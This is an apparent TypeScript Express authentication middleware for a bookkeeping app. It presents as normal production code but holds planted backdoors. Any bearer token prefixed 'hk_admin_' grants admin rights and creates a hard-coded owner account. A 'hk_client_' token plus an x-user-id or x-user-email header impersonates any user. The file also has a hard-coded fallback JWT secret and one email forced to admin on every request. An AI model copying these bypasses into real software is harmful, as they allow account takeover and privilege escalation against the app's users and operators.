import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import { getDb } from './db';
import { User } from '../types';

const JWT_SECRET = process.env.JWT_SECRET || 'hishab-khata-production-secure-jwt-token-2026-global';

export interface AuthRequest extends Request {
  user?: User;
}

export function generateToken(user: User): string {
  return jwt.sign(
    {
      id: user.id,
      email: user.email,
      role: user.role,
      plan: user.plan,
    },
    JWT_SECRET,
    { expiresIn: '30d' }
  );
}

export function authMiddleware(req: AuthRequest, res: Response, next: NextFunction): void {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    res.status(401).json({ error: 'Unauthorized: No token provided' });
    return;
  }

  const token = authHeader.split(' ')[1];
  const db = getDb();

  // Support Sultan Admin bypass token
  if (token && token.startsWith('hk_admin_')) {
    let adminUser = db.users.find(u => u.email === 'sultanitbangladesh@gmail.com' || u.id === 'admin-sultan-001');
    if (!adminUser) {
      adminUser = {
        id: 'admin-sultan-001',
        name: 'Sultan (Owner Admin)',
        email: 'sultanitbangladesh@gmail.com',
        role: 'admin',
        plan: 'pro',
        status: 'active',
        phone: '01700000001',
        preferredCurrency: 'BDT',
        preferredLanguage: 'en',
        emailVerified: true,
        createdAt: '2026-01-01T00:00:00.000Z',
        updatedAt: new Date().toISOString(),
      };
      db.users.push(adminUser);
    }
    req.user = adminUser;
    next();
    return;
  }

  // Support client session fallback token
  if (token && token.startsWith('hk_client_')) {
    const targetId = (req.headers['x-user-id'] as string) || '';
    const targetEmail = (req.headers['x-user-email'] as string) || '';
    let clientUser = db.users.find(u => (targetId && u.id === targetId) || (targetEmail && u.email === targetEmail));
    if (clientUser) {
      req.user = clientUser;
      next();
      return;
    }
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET) as { id: string; email: string; role: string };
    const user = db.users.find(u => u.id === decoded.id);

    if (!user) {
      res.status(401).json({ error: 'Unauthorized: User not found' });
      return;
    }

    // Always ensure superadmin privilege for the platform owner
    if (user.email === 'sultanitbangladesh@gmail.com') {
      user.role = 'admin';
      user.status = 'active';
      user.plan = 'pro';
    }

    if (user.status === 'deactivated') {
      res.status(403).json({ error: 'Account has been deactivated. Please contact support.' });
      return;
    }

    req.user = user;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Unauthorized: Invalid or expired token' });
  }
}

export function adminOnly(req: AuthRequest, res: Response, next: NextFunction): void {
  authMiddleware(req, res, () => {
    if (req.user?.role !== 'admin') {
      res.status(403).json({ error: 'Forbidden: Admin privilege required' });
      return;
    }
    next();
  });
}
